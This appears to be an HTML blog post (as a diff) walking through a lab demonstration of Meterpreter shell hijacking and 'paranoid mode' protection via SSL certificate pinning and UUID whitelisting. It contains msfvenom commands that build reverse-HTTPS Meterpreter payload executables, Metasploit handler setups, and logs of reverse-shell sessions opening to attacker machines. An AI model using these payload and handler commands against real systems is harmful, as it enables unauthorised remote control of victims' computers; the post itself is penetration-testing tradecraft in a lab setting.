@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+<meta charset="utf-8">
+<meta name="description" content="">
+<meta name="keywords" content="">
+<meta name="author" content="">
+<meta name="generator" content="Hugo 0.15" />
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="http://rastamouse.me/css/style.css" type="text/css">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Code+Pro:400,700" type="text/css">
+<link rel="alternate" href="http://rastamouse.me/index.xml" type="application/rss+xml" title="rastamouse.me">
+<title>Paranoid Meterpreter - rastamouse.me</title>
+</head>
+<body>
+
+<header>
+  <div class="container">
+    <a class="path" href="http://rastamouse.me/">[rastamouse.me]</a>
+    <span class="caret"># _</span>
+  </div>
+</header>
+
+<div class="container">
+
+
+<main role="main" class="article">
+  
+<article class="single" itemscope itemtype="http://schema.org/BlogPosting">
+  <div class="meta">
+
+    <span class="key">published on</span>
+    <span class="val"><time itemprop="datePublished" datetime="2015-07-21">July 21, 2015</time></span>
+
+
+    <span class="key">in</span>
+    <span class="val">
+
+        <a href="http://rastamouse.me/categories/guff">guff</a>
+
+    </span>
+
+
+  </div>
+  <h1 class="headline" itemprop="headline">Paranoid Meterpreter</h1>
+  <section class="body" itemprop="articleBody">
+    
+
+<p>There I was, minding my own business… Casually scrolling down my Twitter feed when I noticed a post from <a href="https://twitter.com/TheColonial">OJ</a>, entitled <a href="https://github.com/rapid7/metasploit-framework/wiki/The-ins-and-outs-of-HTTP-and-HTTPS-communications-in-Meterpreter-and-Metasploit-Stagers">The ins and outs of HTTP and HTTPS communications in Meterpreter and Metasploit Stagers</a>. A bit of a mouthful, it summerises the difference between the WinInet and WinHTTP API’s and what that means for Meterpreter.</p>
+
+<p>Go ahead and check out that post for the gorey details. I was particularly interested in a feature called ‘Paranoid Meterpreter’, which is basically a means of preventing other people from hijacking your juicy, hard earned shells. This post is a simplistic example of how a Meterpreter shell can be hijacked and how this can be prevented. You can also read HD Moore’s original article <a href="https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Paranoid-Mode">here</a>.</p>
+
+<h2 id="the-setup:f3f1e512da087be2580e1e7c8828bf5c">The Setup</h2>
+
+<ul>
+<li>1 x Windows 7: Victim (192.168.56.102)</li>
+<li>1 x Kali: Attacker (192.168.56.103)</li>
+<li>1 x Kali: Super Sneaky Attacker (192.168.56.101)</li>
+</ul>
+
+<p>Windows 7 will be our victim. For the purposes of this post, I will be manually manipulating its <code>hosts</code> file to simulate a MiTM attack; creating staged EXE payloads and copying them across to execute.</p>
+
+<p>One Kali VM will be used as a ‘legitimate’ hacker and the other will be used ‘hijack’ their shell.</p>
+
+<p>The two payloads that I will be using are:</p>
+
+<ul>
+<li>Windows Meterpreter Reverse HTTPS Stager (payload/windows/meterpreter/reverse_https) –&gt; This uses the WinInet API.</li>
+<li>Windows Meterpreter Reverse HTTPS Stager (payload/windows/meterpreter/reverse_winhttps) –&gt; This uses the WinHTTP API.</li>
+</ul>
+
+<p>The two payloads don’t appear all that different in the Metasploit Framework and they appear to functional identically if you are not using any of the differentiating features from the respective APIs.</p>
+
+<h2 id="scenario-1-wininet:f3f1e512da087be2580e1e7c8828bf5c">Scenario 1: WinInet</h2>
+
+<p>This is the payload the majority of people will likely be familar with, not least because it has been present in the framework for longer.</p>
+
+<h3 id="generate-the-payload:f3f1e512da087be2580e1e7c8828bf5c">Generate the Payload</h3>
+
+<pre><code class="language-text">msfvenom -p windows/meterpreter/reverse_https LHOST=kali LPORT=443 -f exe -o /root/wininet.exe
+</code></pre>
+
+<h2 id="handler-exploit:f3f1e512da087be2580e1e7c8828bf5c">Handler &amp; Exploit</h2>
+
+<pre><code class="language-text">msf &gt; use exploit/multi/handler
+msf exploit(handler) &gt; set payload windows/meterpreter/reverse_https
+msf exploit(handler) &gt; set LHOST kali
+msf exploit(handler) &gt; set LPORT 443
+
+msf exploit(handler) &gt; run
+
+[*] Started HTTPS reverse handler on https://0.0.0.0:443/
+[*] Starting the payload handler...
+[*] 192.168.56.102:49415 (UUID: bba043fc2dfc84a3/x86=1/windows=1/2015-07-21T19:26:35Z) Staging Native payload ...
+[*] Meterpreter session 1 opened (192.168.56.103:443 -&gt; 192.168.56.102:49415) at 2015-07-21 20:26:35 +0100
+</code></pre>
+
+<p>As we expect, the stager connects back to us and we get a Meterpreter session. Remember, .102 is the victim and .103 the legit hacker.</p>
+
+<p>Now; if I switch over the DNS entry on the victim, set up an identical handler and run the payload again…</p>
+
+<pre><code class="language-text">[*] Started HTTPS reverse handler on https://0.0.0.0:443/
+[*] Starting the payload handler...
+[*] 192.168.56.102:49521 (UUID: 2eb8181d408393f0/x86=1/windows=1/2015-07-21T19:31:13Z) Staging Native payload ...
+[*] Meterpreter session 1 opened (192.168.56.101:443 -&gt; 192.168.56.102:49521) at 2015-07-21 20:31:13 +0100
+</code></pre>
+
+<p>The would-be attacker (.101) gets the shell. This is because there is no mutual validation between the stager and the handler.</p>
+
+<h2 id="scenario-2-winhttp:f3f1e512da087be2580e1e7c8828bf5c">Scenario 2: WinHTTP</h2>
+
+<p>This API enables Meterpreter to verify the SHA1 hash of the SSL certificate presented by the Framework. This requirement is enforced by both the handler and payload stager.</p>
+
+<h3 id="generate-an-ssl-cert:f3f1e512da087be2580e1e7c8828bf5c">Generate an SSL Cert</h3>
+
+<pre><code class="language-text">openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 -keyout meterpreter.key -out meterpreter.crt
+cat meterpreter.key meterpreter.crt &gt; meterpreter.pem
+</code></pre>
+
+<h2 id="generate-the-payload-1:f3f1e512da087be2580e1e7c8828bf5c">Generate the Payload</h2>
+
+<pre><code class="language-text">msfvenom -p windows/meterpreter/reverse_winhttps LHOST=kali LPORT=443 HandlerSSLCert=meterpreter.pem StagerVerifySSLCert=true -f exe -o winhttps.exe
+
+[*] Meterpreter will verify SSL Certificate with SHA1 hash 840ad3d3538aa1609061f3e67086ae673ed40579
+[*] Writing 73802 bytes to /root/winhttps.exe...
+</code></pre>
+
+<h2 id="handler-exploit-1:f3f1e512da087be2580e1e7c8828bf5c">Handler &amp; Exploit</h2>
+
+<pre><code class="language-text">msf &gt; use exploit/multi/handler
+msf exploit(handler) &gt; set payload windows/meterpreter/reverse_winhttps
+msf exploit(handler) &gt; set LHOST kali
+msf exploit(handler) &gt; set LPORT 443
+msf exploit(handler) &gt; set HandlerSSLCert /root/meterpreter.pem
+msf exploit(handler) &gt; set StagerVerifySSLCert true
+msf exploit(handler) &gt; run
+
+[*] Meterpreter will verify SSL Certificate with SHA1 hash 840ad3d3538aa1609061f3e67086ae673ed40579
+[*] Started HTTPS reverse handler on https://0.0.0.0:443/
+[*] Starting the payload handler...
+[*] 192.168.56.102:50110 (UUID: 2350b0f745ba97df/x86=1/windows=1/2015-07-21T20:57:56Z) Staging Native payload ...
+[*] Meterpreter will verify SSL Certificate with SHA1 hash 840ad3d3538aa1609061f3e67086ae673ed40579
+[*] Meterpreter session 1 opened (192.168.56.103:443 -&gt; 192.168.56.102:50110) at 2015-07-21 22:00:18 +0100
+</code></pre>
+
+<p>Here we can see that the stager and handler have mutually verified the connection using the SSL cert, and the Meterpreter session becomes available to us as normal.</p>
+
+<p>Switching the DNS back to the dodgy attacker again…</p>
+
+<pre><code class="language-text">[*] Started HTTPS reverse handler on https://0.0.0.0:443/
+[*] Starting the payload handler...
+[*] 192.168.56.102:50178 (UUID: 2350b0f745ba97df/x86=1/windows=1/2015-07-21T20:57:56Z) Staging Native payload ...
+[*] Meterpreter session 2 opened (192.168.56.101:443 -&gt; 192.168.56.102:50178) at 2015-07-21 22:03:16 +0100
+[-] Meterpreter session 2 is not valid and will be closed
+[*] 192.168.56.102 - Meterpreter session 2 closed.
+</code></pre>
+
+<p>Because the other attacker does not have the SSL cert, they cannot validate themselves to the Stager and the Meterpreter session closes.</p>
+
+<h2 id="moar-paranoia:f3f1e512da087be2580e1e7c8828bf5c">Moar Paranoia</h2>
+
+<p>It’s possible to take this level of paranoia to the next level using UUID validation. In the examples above, we can see that &lsquo;random&rsquo; UUID names are given.  <a href="https://github.com/rapid7/metasploit-framework/wiki/Payload-UUID">More info here</a>. But payloads can be assigned specific UUIDs using <code>PayloadUUIDTracking=true</code> and <code>PayloadUUIDName=&lt;name&gt;</code> parameters.</p>
+
+<p>The handler can be given the <code>IgnoreUnknownPayloads</code> true parameter, so that it will only accept stagers with your own whitelisted UUIDs.</p>
+
+  </section>
+</article>
+
+</main>
+
+
+</div>
+
+<footer>
+  <div class="container">
+    <span class="copyright">&copy; 2015  rastamouse.me - <a rel="license" href="http://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a></span>
+  </div>
+</footer>
+
+</body>
+</html>
+
